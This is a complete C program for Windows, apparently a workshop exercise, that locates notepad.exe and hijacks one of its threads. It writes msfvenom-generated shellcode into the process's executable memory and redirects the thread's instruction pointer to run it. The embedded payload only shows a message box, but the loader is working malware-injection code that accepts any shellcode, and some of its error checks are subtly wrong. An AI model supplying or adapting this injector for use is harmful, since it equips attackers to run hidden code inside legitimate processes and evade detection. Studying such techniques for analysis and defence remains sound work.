#include <windows.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <tlhelp32.h>

#define NT_SUCCESS(Status) (((NTSTATUS)(Status)) >= 0)

DWORD searching_seek_and_destroy(wchar_t* process_name) {

    HANDLE handleSnapshot;
    PROCESSENTRY32 process;
    int pid = 0;

    handleSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);

    if (handleSnapshot == INVALID_HANDLE_VALUE) goto ExitAndCleanup;

    process.dwSize = sizeof(PROCESSENTRY32);

    if (!Process32First(handleSnapshot, &process)) goto ExitAndCleanup;

    do {

        printf("process name : %ws\n", process.szExeFile);

        if (lstrcmpiW((LPCWSTR)process_name, process.szExeFile) == 0) {

            printf("\nWe found %ws !\n", process.szExeFile);
            pid = process.th32ProcessID;
            break;
        }
    } while (Process32Next(handleSnapshot, &process));

ExitAndCleanup:
    if (handleSnapshot != INVALID_HANDLE_VALUE) {
        CloseHandle(handleSnapshot);
    }
    else {
        printf("Error while taking snapshot {X__x}\n");
    }

    return pid;
}

HANDLE searching_thread(int pid) {

    HANDLE handleSnapshot;
    HANDLE handleThread = NULL;
    THREADENTRY32 thread;

    handleSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);

    if (handleSnapshot == INVALID_HANDLE_VALUE) goto ExitAndCleanup;

    thread.dwSize = sizeof(THREADENTRY32);

    if (!Thread32First(handleSnapshot, &thread)) goto ExitAndCleanup;

    do {

        if (thread.th32OwnerProcessID == pid){

            printf("\nWe found a thread to inject!\n");
            handleThread = OpenThread(THREAD_GET_CONTEXT|THREAD_SET_CONTEXT| THREAD_SUSPEND_RESUME, FALSE, thread.th32ThreadID);
            break;
        }
    } while (Thread32Next(handleSnapshot, &thread));


ExitAndCleanup:
    if (handleSnapshot != INVALID_HANDLE_VALUE) {
        CloseHandle(handleSnapshot);
    }
    else {
        printf("Error while taking snapshot {X__x}\n");
    }

    return handleThread;

}


void injection_thread(unsigned char* payload, SIZE_T size, wchar_t* target_process) {

    HANDLE handleProcess = NULL;
    HANDLE handleThread = NULL; 
    LPVOID PointerToCode = NULL;
    CONTEXT thread_context;
    thread_context.ContextFlags = CONTEXT_FULL;
    int pid = 0;

    pid = searching_seek_and_destroy(target_process);

    if (pid == 0) goto ExitAndCleanup;
  
    handleThread = searching_thread(pid);

    if (handleThread == INVALID_HANDLE_VALUE) goto ExitAndCleanup;

    SuspendThread(handleThread);

    GetThreadContext(handleThread, &thread_context);

    handleProcess = OpenProcess(PROCESS_CREATE_THREAD | PROCESS_VM_OPERATION | PROCESS_VM_WRITE, FALSE, (DWORD)pid);

    if (handleProcess == INVALID_HANDLE_VALUE) goto ExitAndCleanup;

    PointerToCode = VirtualAllocEx(handleProcess, NULL, size, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);

    if (PointerToCode == NULL) goto ExitAndCleanup;

    WriteProcessMemory((LPVOID)handleProcess, PointerToCode, payload, size, NULL);

    #ifdef _M_IX86 
                thread_context.Eip = (DWORD64)PointerToCode;
    #else
                thread_context.Rip = (DWORD64)PointerToCode;
    #endif

    SetThreadContext(handleThread, &thread_context);

    ResumeThread(handleThread);

ExitAndCleanup:
    if (pid == 0) {
        printf("Error. Notepad not found {X__x}\n");
    }
    if (handleThread != INVALID_HANDLE_VALUE) {
        CloseHandle(handleThread);
    }
    else {
        printf("Error. thread not found {X___x}\n");
    }
    if (handleProcess != INVALID_HANDLE_VALUE) {
        CloseHandle(handleProcess);
    }
    else {
        printf("Error while opening process {X__x}\n");
    }
    if (PointerToCode == NULL) {
        printf("Error while allocating memory {X__x}\n");
    }

}

void main(void) {
    
    // shellcode generation MSGBOX -> msfvenom -p windows/x64/messagebox TITLE="Evil Malware" TEXT="BlackHoodie Rulez!" ICON=WARNING EXITFUNC=thread -f c
    //Payload size: 327 bytes
    unsigned char MyPayload[] =
        "\xfc\x48\x81\xe4\xf0\xff\xff\xff\xe8\xd0\x00\x00\x00\x41\x51"
        "\x41\x50\x52\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60\x3e\x48"
        "\x8b\x52\x18\x3e\x48\x8b\x52\x20\x3e\x48\x8b\x72\x50\x3e\x48"
        "\x0f\xb7\x4a\x4a\x4d\x31\xc9\x48\x31\xc0\xac\x3c\x61\x7c\x02"
        "\x2c\x20\x41\xc1\xc9\x0d\x41\x01\xc1\xe2\xed\x52\x41\x51\x3e"
        "\x48\x8b\x52\x20\x3e\x8b\x42\x3c\x48\x01\xd0\x3e\x8b\x80\x88"
        "\x00\x00\x00\x48\x85\xc0\x74\x6f\x48\x01\xd0\x50\x3e\x8b\x48"
        "\x18\x3e\x44\x8b\x40\x20\x49\x01\xd0\xe3\x5c\x48\xff\xc9\x3e"
        "\x41\x8b\x34\x88\x48\x01\xd6\x4d\x31\xc9\x48\x31\xc0\xac\x41"
        "\xc1\xc9\x0d\x41\x01\xc1\x38\xe0\x75\xf1\x3e\x4c\x03\x4c\x24"
        "\x08\x45\x39\xd1\x75\xd6\x58\x3e\x44\x8b\x40\x24\x49\x01\xd0"
        "\x66\x3e\x41\x8b\x0c\x48\x3e\x44\x8b\x40\x1c\x49\x01\xd0\x3e"
        "\x41\x8b\x04\x88\x48\x01\xd0\x41\x58\x41\x58\x5e\x59\x5a\x41"
        "\x58\x41\x59\x41\x5a\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41"
        "\x59\x5a\x3e\x48\x8b\x12\xe9\x49\xff\xff\xff\x5d\x49\xc7\xc1"
        "\x30\x00\x00\x00\x3e\x48\x8d\x95\x1a\x01\x00\x00\x3e\x4c\x8d"
        "\x85\x2d\x01\x00\x00\x48\x31\xc9\x41\xba\x45\x83\x56\x07\xff"
        "\xd5\xbb\xe0\x1d\x2a\x0a\x41\xba\xa6\x95\xbd\x9d\xff\xd5\x48"
        "\x83\xc4\x28\x3c\x06\x7c\x0a\x80\xfb\xe0\x75\x05\xbb\x47\x13"
        "\x72\x6f\x6a\x00\x59\x41\x89\xda\xff\xd5\x42\x6c\x61\x63\x6b"
        "\x48\x6f\x6f\x64\x69\x65\x20\x52\x75\x6c\x65\x7a\x21\x00\x45"
        "\x76\x69\x6c\x20\x4d\x61\x6c\x77\x61\x72\x65\x00";
    
    SIZE_T SizePayload = sizeof(MyPayload);

    printf("Payload size is %d bytes\n", (int)SizePayload);

    injection_thread(MyPayload, SizePayload, L"notepad.exe");

    printf("Done!\n");

}


